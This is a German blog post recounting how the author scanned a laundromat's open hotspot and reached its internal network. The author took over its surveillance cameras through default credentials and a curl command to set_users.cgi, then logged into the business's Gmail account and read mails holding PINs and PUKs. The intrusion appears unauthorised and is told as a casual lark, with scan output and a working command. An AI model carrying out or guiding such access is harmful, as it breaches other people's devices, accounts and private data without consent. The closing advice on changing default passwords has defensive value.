---
title: Waschsalon - Wenn man sich waschen sieht.
layout: post
permalink: waschsalon-wenn-man-sich-waschen-sieht
published: true
---
Waschsalon mit Freundin. Offener Hotspot. Much Profit. Wow.

# Wir scannen den offenen Hotspot
Sobald ich in einen Hotspot komme scanne ich das Netzwerk, weil mich interessiert welche Geraete noch so herumschwirren. In diesem Fall waren auch wieder nur ein paar Handys und der Router verbunden. Nichts ungewoehnliches also.

Doch der Router stach irgendwie raus.
```
# nmap -A -T4 -sV -oN gast.network.nmap 192.168.3.192/24
Nmap scan report for 192.168.3.1
Host is up (0.0011s latency).
Not shown: 988 closed ports
PORT      STATE    SERVICE      VERSION
53/tcp    open     domain       dnsmasq 2.57
| dns-nsid: 
|_  bind.version: dnsmasq-2.57
80/tcp    filtered http
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
515/tcp   filtered printer
631/tcp   filtered ipp
2869/tcp  filtered icslap
5102/tcp  open     http         Boa 0.94.13
|_http-server-header: Boa/0.94.13
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel:2.6.32.32
```
Warum ist Port 5102 offen und dahinter laeuft ein Boa HTTP Server?
Wenn man die Seite in einem Browser oeffnet, kommt ein einfacher Login ohne jegliche Bezeichnung des Geraetes, was an sich schonmal positiv ist. Graebt man ein wenig im Source Code ist diese Stelle recht auffaellig:
![Default Login](/content/images/2016/01/2016-01-23-192614_1169x323_scrot.png)
Damit hatte ich wohl den Standard Benutzerlogin fuer den Admin. Nachdem man aber bei einem Login die Daten aendern MUSS(!) machte ich mir keine grossen Hoffnungen. Doch siehe da:
![Camera](/content/images/2016/01/2016-01-23-192418_1364x647_scrot.png)
Bei herumstoebern auf der Kamera findet man schnell den Bereich zur Konfiguration des WLANS.
![internes WLAN](/content/images/2016/01/2016-01-23-193017_518x160_scrot.png)
Doch nicht nur das. Bei einer Bewegung zwischen den Zeiten 1 und 5 Uhr sendet die Kamera ueber SMTP ueber einen Googlemail Account Bilder an den Betreiber des Waschsalons.
![googlemail](/content/images/2016/01/2016-01-23-194321_614x468_scrot.png)
Nunja...betrachten wir den Googlemail Account spaeter. Schauen wir uns doch erstmal weiter im internen Netz um. 

# Das interne Netzwerk
Nach Authentifizierung im internen WLAN und Scan ueber alles sind ein paar Geraete zu finden die online sind.
```
# nmap -sV -p- -oN full.scan.nmap 192.168.2.1/24
Nmap scan report for easy.box (192.168.2.1)
Host is up (0.0054s latency).
Not shown: 65475 closed ports, 52 filtered ports
PORT      STATE SERVICE    VERSION
53/tcp    open  domain     dnsmasq 2.57
80/tcp    open  http       Apache httpd
515/tcp   open  printer    BusyBox lpd
[...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel:2.6.32.32

Nmap scan report for 192.168.2.102
Host is up (0.0041s latency).
Not shown: 65516 closed ports
PORT      STATE    SERVICE VERSION
1424/tcp  filtered hybrid
5102/tcp  open     http    Boa 0.94.13
[...]

Nmap scan report for android-ef9cbe831bca3663 (192.168.2.117)
Host is up (0.054s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
8008/tcp  open  http    Amazon Whisperplay DIAL REST service
[...]
Service Info: Device: media device

Nmap scan report for 192.168.2.129
Host is up (0.0050s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
5129/tcp open  http    Boa 0.94.13

Nmap scan report for 192.168.2.161
Host is up (0.040s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
5161/tcp open  http    Boa 0.94.13

Nmap scan report for 192.168.2.188
Host is up (0.0036s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
5188/tcp open  http    Boa 0.94.13

Nmap scan report for 192.168.2.199
Host is up (0.0045s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
5199/tcp open  http    Boa 0.94.13
```
Um den Scan mal zusammenzufassen haben wir 7 Geraete im Netz (ohne meinen Laptop). Auf den meisten laeuft ein Boa HTTP Server, wobei hier davon auszugehen ist, dass es sich um Ueberwachungskameras handelt. Interessant ist die Portvergabe, doch dazu spaeter ein wenig mehr.
Dazu kommt eine Geraet, was sich als Android ausgibt und einen Port 8008 offen hat.
Als ich ein paar Tage spaeter nochmal vorbeiging um eine Vermutung fuer das Android Geraet zu bestaetigen tauchten 2 weitere Geraete im Netzwerk auf. Das eine war von Advantech (die stellen interne Boards fuer IoT Geraete her) und eine IP Adresse, die ich bereits in den FTP Konfiguration der Kamera gesehen hatte.

# Weitere Kameras
Die These der Kameras lies sich relativ schnell bestaetigen. Alle Ueberwachungskameras hatten standard Benutzereinstellungen und ich konnte ein Passwort relativ schnell setzen mit:
```language-bash
curl "http://${1}/set_users.cgi?user=admin&pwd=&user1=admin&pwd1=admin&pri1=2&user2=&pwd2=&pri2=&user3=&pwd3=&pri3=&user4=&pwd4=&pri4=&user5=&pwd5=&pri5=&user6=&pwd6=&pri6=&user7=&pwd7=&pri7=&user8=&pwd8=&pri8="
```
Damit fielen alle Ueberwachungskameras.
![129](/content/images/2016/01/2016-01-23-201036_1363x700_scrot.png)
![161](/content/images/2016/01/2016-01-23-201220_1363x703_scrot.png)
![188](/content/images/2016/01/2016-01-23-200838_1364x701_scrot-1.png)
![199](/content/images/2016/01/2016-01-23-200631_1362x703_scrot.png)

Stellte sich nach wie vor die Frage nach dem Android Geraet.

# Das mysterioese Android Geraet
Ich konnte mir daraus keinen Reim machen, vermutete aber einen FireTV. Leider hatte ich an dem Tag nichtmehr die Zeit und Muse das zu verifizieren. Damit ich nicht umsonst nochmal hinfahren musste, fragte ich auf Twitter nach, ob jemand das Verhalten eines FireTV bekannt war. Netterweise hat [@schniggie](https://twitter.com/schniggie) da mal fuer mich an seinem nachgeschaut (Danke dafuer).
![firetv](/content/images/2016/01/2016-01-29-165646_493x333_scrot.png)
Ich bin also noch einmal hingefahren um zu testen ob es sich wirklich um einen FireTV handelt. Eigentlich wollte ich ja [Rick Astley](https://www.youtube.com/watch?v=DLzxrzFCyOs) drauf laufen lassen, aber nachdem Leute im Laden waren, habe ich doch davon abgesehen. Dennoch konnte ich ueber einen Login mit der FireTV Remote App den FireTV verifizieren.
![FireTV2](/content/images/2016/01/FullSizeRender.jpg)

# Googlemail Account
Glaubt bloss nicht, dass ich den Googlemail Account vergessen haette. *(Dieser Account ist klar mit dem Unternehmen verknuepft und weisst in der Namensgebung keinen privaten Kontext auf)*
Bei Login in diesen Account kommt eine Seite mit Recovery Options auf der auch eine Handy Nummer angegeben ist. 
![Recovery Options](/content/images/2016/01/2016-01-23-194348_462x654_scrot.png)
Keine Ahnung wozu die gehoert. Hab sie auch nicht angerufen.
Im Posteingang lagen insgesamt 5 Mails mit Pins und Puks von "Notfallhandys" eines anderen Unternehmens. Versendet waren Protokolle vom Cashpoint und Kameras.
Mit dem Account ist noch ein Handy verknuepft, was aber leider keine Standortfreigabe aktiviert hat.
Man koennte hier noch weiterstoebern um weitere Informationen zu finden, aber meeeh.

# Die Sache mit den Ports
Stellt sich noch die letzte Frage: Warum sind alle Kameras auf unterschiedlichen Ports?
Ich bin nur ins interne Netzwerk gekommen weil ein Port Forwarding auf dem Router nicht korrekt konfiguriert war. Es liegt also nahe, dass alle Ports durchgereicht werden. Aber wohin?
In's Internet natuerlich. Wohin auch sonst!?
Alle Kameras sind von aussen mit Standard Benutzernamen und leerem Passwort zugaenglich.

![von aussen zugaenglich](/content/images/2016/01/2016-01-24-165034_1168x570_scrot.png)

# Fazit
Normalerweise sollten Standardpasswoerter in internen Netzen nicht so das Problem sein. Doch sobald eine Fehlkonfiguration vorliegt (wie hier die Portweiterleitung) faellt das gesamte Netzwerk. Deswegen, auch wenn es noch so unwichtig erscheint, aendert Standardpasswoerter!
Der ganze "Angriff" hat sich innerhalb von 1.5-2h abgespielt. Mit mehr Zeit und waermerer Umgebung[^n] (da drinnen wird nicht geheizt), haette man sicher noch weiter eindringen koennen.

So Long

[^n]: "...oder einfach mal mit ein bisschen Bewegung. Er hat mich alles alleine machen lassen und saß zwei Stunden nur auf dem Sofa!" - Anm. der Freundin.